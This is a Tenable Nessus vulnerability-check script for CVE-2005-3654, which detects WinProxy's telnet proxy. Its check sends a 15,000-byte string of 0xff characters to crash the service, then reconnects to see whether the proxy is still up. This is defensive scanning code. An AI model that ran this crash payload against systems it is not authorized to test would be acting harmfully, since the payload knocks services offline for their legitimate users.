#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20392);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2005-3654");
  script_bugtraq_id(16149);
  script_xref(name:"OSVDB", value:"22239");

  script_name(english:"WinProxy < 6.1a Telnet Proxy Remote DoS");
  script_summary(english:"Checks for denial of service vulnerability in WinProxy < 6.1a Telnet Proxy");

 script_set_attribute(attribute:"synopsis", value:
"The remote telnet proxy server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running WinProxy, a proxy server for Windows. 

The installed version of WinProxy's telnet proxy fails to handle a
long string of 0xff characters.  An attacker may be able to exploit
this issue to crash the proxy, thereby denying service to valid users." );
 script_set_attribute(attribute:"see_also", value:"http://www.idefense.com/intelligence/vulnerabilities/display.php?id=353" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8c88612f" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to WinProxy version 6.1a or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"Windows");
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");
  script_dependencies("find_service1.nasl");
  script_require_ports("Services/telnet", 23);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("telnet_func.inc");


port = get_kb_item("Services/telnet");
if (!port) port = 23;
if (!get_tcp_port_state(port)) exit(0);


# Make sure the service looks like WinProxy.
banner = get_telnet_banner(port:port);
if (
  banner && 
  "Enter computer name to connect to." >< banner
) {
  # Flag it as a proxy.
  register_service(port:port, ipproto:"tcp", proto:"telnet_proxy");

  # Try to exploit it.
  soc = open_sock_tcp(port);
  if (soc) {
    banner = recv(socket:soc, length:4096);
    send(socket:soc, data:crap(length:15000, data:raw_string(0xff)));
    res = recv(socket:soc, length:1024);
    close(soc);

    # Now try to reconnect.
    soc = open_sock_tcp(port);
    if (soc) {
      banner = recv(socket:soc, length:4096);
      send(socket:soc, data:SCRIPT_NAME);
      res2 = recv(socket:soc, length:1024);
      close(soc);
    }

    # There's a problem if we didn't get a response the second time.
    if (!strlen(res) && !strlen(res2)) {
      security_hole(port);
      exit(0);
    }
  }
}
